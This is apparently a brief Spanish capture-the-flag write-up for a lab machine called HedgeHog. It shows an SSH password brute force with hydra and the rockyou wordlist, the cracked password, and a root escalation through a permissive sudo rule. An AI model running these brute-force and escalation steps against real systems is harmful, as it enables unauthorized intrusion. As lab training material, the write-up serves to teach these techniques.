# HedgeHog

En la web solo se muestra la palabra *tails*
`hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
**3117548331**

## Escalada

`sudo -l`
*(sonic) NOPASSWD: ALL*
El usuario sonic es capaz de ejecutar cualquier binario a nivel de sudoer
`sudo -u sonic /bin/bash`

Se consigue acceso a sonic y ahora se puede ejecutar */bin/bash* para escalar a root
`sudo su`
